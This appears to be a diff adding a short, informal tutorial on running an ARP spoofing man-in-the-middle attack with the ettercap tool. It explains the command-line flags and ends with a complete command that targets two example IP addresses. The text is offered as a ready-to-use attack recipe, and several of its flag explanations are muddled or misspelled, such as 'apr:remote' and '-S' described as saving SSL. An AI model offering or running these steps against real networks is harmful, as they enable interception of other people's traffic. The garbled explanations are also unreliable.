@@ -1,0 +1,14 @@
+the arp spoofing attack is very powerfull :)
+it's simple attack lets see how to make arp spoofing attack: 
+first lets start the tool it's name ' ettercap '
+command: sudo ettercap ( -h #for help )
+
+-T -> for text only with out GUI
+-S -> to save ssl
+-i -> to set interface
+-M -> man in the midle attack 
+apr:remote -> arp spoofing
+/ip_addr_1// -> the mac address you want to steal
+/ip_addr_2// -> the device you want to spoof # U can chose more then one by writing : /192.168.0.0-255//
+
+command: sudo ettercap -T -S -i eth0 -M arp:remote /69.69.69.1// /69.69.69.5//
